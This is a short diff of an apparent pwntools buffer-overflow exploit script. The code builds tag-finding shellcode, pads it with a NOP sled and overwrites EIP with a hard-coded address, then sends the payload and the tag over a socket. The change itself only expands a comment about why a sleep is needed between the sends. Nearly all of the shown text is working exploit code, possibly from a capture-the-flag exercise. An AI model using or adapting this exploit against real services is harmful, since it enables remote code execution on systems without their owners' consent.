@@ -17,8 +17,13 @@ shellcode = scramble(asm(findtagsh(tag)), avoid = '\x00\n')
 eip = p32(0x0804a080)
 sock.send(nops(0xD4 - len(shellcode)) + shellcode + eip + '\n')
 
-# This not nececary as there is no leftover garbage
-# however it is kept here as a reference
+# This is not nececary if there is no leftovers from the exploit
+# and program cannot accidentally consume the tag while
+# running the exploit. The latter can arise if you have a
+# recv(sockfd, buf, 4096, 0) while only sending 500 bytes.
+#
+# In both these cases, it is nececary to sleep, to make sure that
+# the tag will be the first 4 bytes of a seperate recv.
 time.sleep(0.1) 
 
 sock.send(p32(tag).ljust(127))
